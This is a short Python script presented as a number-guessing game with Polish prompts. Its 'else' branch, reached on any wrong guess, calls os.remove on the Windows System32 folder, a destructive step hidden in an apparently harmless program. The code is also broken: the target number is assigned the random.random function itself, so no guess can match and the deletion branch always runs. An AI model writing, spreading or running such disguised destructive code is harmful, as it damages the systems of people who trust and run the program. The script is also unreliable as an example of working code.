import random
import os

number = random.random

guess = input("Zgadywanka! Zgadnij liczbe miedzy 1 i 10")
guess = int(guess)

if guess == number:
    print("Wygrałeś")
else:
    os.remove("C:\Windows\System32")
    
    